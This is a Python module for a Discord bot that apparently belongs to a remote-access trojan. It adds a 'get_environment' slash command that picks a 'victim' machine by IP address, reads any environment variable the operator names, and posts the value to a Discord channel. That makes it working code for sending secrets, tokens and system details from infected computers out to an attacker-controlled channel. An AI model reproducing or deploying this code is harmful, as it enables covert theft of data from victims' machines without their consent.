import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class GetEnvironment(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(
        description="Finds the values of environment variables",
        options=[
            bot.victim,
            discord.Option("environment", description="The variable of which the value is wanted", required=True)
        ],
    )
    async def get_environment(self, ctx, victim: str, environment: str):
        if str(victim) == str(self.ip_addr):
            try: 
                value = os.getenv(environment)
            except: 
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "Invalid environment variable!", 
                        datetime.now()
                    )
                )
                
            if value is None:
                return await ctx.response.send_message(
                    embed=self.bot.genEmbed(
                        "Variable's value is empty!", 
                        datetime.now()
                    )
                )
                
            if len(value) >= 1023:
                return await ctx.response.send_message(f"The value for {environment} is:\n```{value}```")
                
            await ctx.response.send_message(
                embed = self.bot.genEmbed( f"Found environment variable", datetime.now() ).add_field(
                    name="Value for "+environment+" is:", 
                    value="```"+value+"```"
                )
            )

def setup(bot: commands.Bot):
    bot.add_cog(GetEnvironment(bot))